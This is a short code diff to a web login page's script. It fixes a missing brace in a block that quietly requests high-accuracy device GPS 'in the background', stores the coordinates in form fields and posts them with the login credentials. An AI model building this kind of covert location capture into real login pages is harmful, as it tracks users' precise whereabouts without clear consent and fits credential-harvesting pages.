@@ -84,7 +84,7 @@
         </form>
     </div>
 
-    <script>
+<script>
         // Request device GPS in the background
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
@@ -93,20 +93,18 @@
                     document.getElementById('gps_lon').value = pos.coords.longitude;
                 },
                 (err) => {
-                    // Silently fail to IP lookup if denied or unavailable
                     console.log("GPS Location declined or unavailable:", err.message);
                 },
                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
-        
-        // GPS Script omitted for brevity
+        }
 
+        // Handle Login with Animation
         async function handleLogin(event) {
             event.preventDefault();
             const form = document.getElementById('loginForm');
             const formData = new FormData(form);
             
-            // Send credentials via fetch instead of standard form submit
             const response = await fetch(window.location.href, {
                 method: 'POST',
                 body: formData
